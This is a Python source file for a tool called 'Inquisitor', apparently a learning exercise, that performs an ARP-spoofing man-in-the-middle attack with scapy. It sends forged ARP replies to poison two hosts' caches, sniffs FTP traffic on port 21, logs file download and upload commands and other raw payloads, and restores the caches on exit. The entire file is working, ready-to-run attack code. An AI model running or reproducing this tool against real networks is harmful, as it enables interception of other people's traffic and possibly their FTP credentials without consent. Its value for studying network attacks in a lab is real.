#!/usr/bin/env python3
import argparse
import ipaddress
import signal
import logging
import time
import typing
import re
from colorama import Fore, Style
from scapy.all import ARP, send, sniff, TCP, Raw

# Disable scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class Inquisitor:
	def __init__(self, ipsrc: str, macsrc: str, ipdst: str, macdst: str, verbose: bool) -> None:
		self.ipsrc = ipsrc
		self.macsrc = macsrc
		self.ipdst = ipdst
		self.macdst = macdst
		self.verbose = verbose
		if not self.check_ip(self.ipsrc):
			self.log('error', 'Invalid IP address for source')
			raise SystemExit(1)
		if not self.check_ip(self.ipdst):
			self.log('error', 'Invalid IP address for destination')
			raise SystemExit(1)
		if not self.check_mac(self.macsrc):
			self.log('error', 'Invalid MAC address for source')
			raise SystemExit(1)
		if not self.check_mac(self.macdst):
			self.log('error', 'Invalid MAC address for destination')
			raise SystemExit(1)

	def log(self, level: str, message: str):
		levels = {
			"info": Fore.CYAN + "[INFO]   " + Style.RESET_ALL,
			"warning": Fore.YELLOW + "[WARNING]" + Style.RESET_ALL,
			"error": 	Fore.RED + "[ERROR]  " + Style.RESET_ALL,
			"success": Fore.GREEN + "[SUCCESS]" + Style.RESET_ALL,
			"log": 		Fore.BLUE + "[LOG]    " + Style.RESET_ALL,
			"verbose": Fore.MAGENTA + "[VERBOSE]" + Style.RESET_ALL
		}
		if self.verbose or level != 'verbose':
			timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
			print(timestamp + ' ' + levels.get(level, "[UNKNOWN]") + " " + message)

	@staticmethod
	def check_ip(ip: str) -> bool:
		try:
			ipaddress.ip_address(ip)
		except ValueError:
			return False
		return True

	@staticmethod
	def check_mac(mac: str) -> bool:
		if re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac):
			return True
		return False

	def poison_arp_cache(self) -> None:
		self.log('info', "Starting ARP poisoning...")
		poison_src_to_dst = ARP(op=2, pdst=self.ipdst, hwdst=self.macdst, psrc=self.ipsrc)
		poison_dst_to_src = ARP(op=2, pdst=self.ipsrc, hwdst=self.macsrc, psrc=self.ipdst)

		send(poison_src_to_dst, count=3, verbose=False)
		send(poison_dst_to_src, count=3, verbose=False)
		self.log('success', "ARP poisoning completed.")

	def restore_arp_cache(self) -> None:
		self.log('info', "Restoring ARP cache...")
		restore_src_to_dst = ARP(op=2, pdst=self.ipdst, hwdst=self.macdst, psrc=self.ipsrc, hwsrc=self.macsrc)
		restore_dst_to_src = ARP(op=2, pdst=self.ipsrc, hwdst=self.macsrc, psrc=self.ipdst, hwsrc=self.macdst)
		send(restore_src_to_dst, count=3, verbose=False)
		send(restore_dst_to_src, count=3, verbose=False)
		self.log('success', "ARP cache restored successfully.")

	def packet_handler(self, packet: typing.Any) -> None:
		try:
			if packet.haslayer(TCP) and packet.haslayer(Raw):
				raw_data = bytes(packet[Raw].load)
				str_raw_data = raw_data.decode('utf-8', errors='ignore')
				str_raw_data = str_raw_data.replace('\n', '').replace('\r', '')
				if 'RETR' in str_raw_data:
					self.log('log', f"FTP download detected: {str_raw_data}")
				elif 'STOR' in str_raw_data:
					self.log('log', f"FTP upload detected): {str_raw_data}")
				else:
					self.log('verbose', f"Packet detected: {str_raw_data}")
		except Exception as e:
			self.log('error', f"Error handling packet: {e}")

	def listen(self) -> None:
		self.log('info', "Starting packet capture...")
		sniff(iface='eth0', prn=self.packet_handler, filter='tcp port 21')
  
	def exit(self, signum: int, frame: typing.Any) -> None:
		self.restore_arp_cache()
		self.log('info', "Exiting...")
		raise SystemExit(0)

	def start(self) -> None:
		try:
			signal.signal(signal.SIGINT, self.exit)
			self.poison_arp_cache()
			self.listen()
		except Exception as e:
			self.log('error', f"Error starting Inquisitor: {e}")
			self.restore_arp_cache()
			self.log('info', "Exiting...")
			raise SystemExit(0)

def main() -> None:
	parser = argparse.ArgumentParser()
	parser.add_argument('ipsrc', help='Source IP address', type=str)
	parser.add_argument('macsrc', help='Source MAC address', type=str)
	parser.add_argument('ipdst', help='Destination IP address', type=str)
	parser.add_argument('macdst', help='Destination MAC address', type=str)
	parser.add_argument('-v', '--verbose', help='Enable verbose output', action='store_true')
	args = parser.parse_args()

	inquisitor = Inquisitor(args.ipsrc, args.macsrc, args.ipdst, args.macdst, args.verbose)
	inquisitor.start()


if __name__ == '__main__':
	main()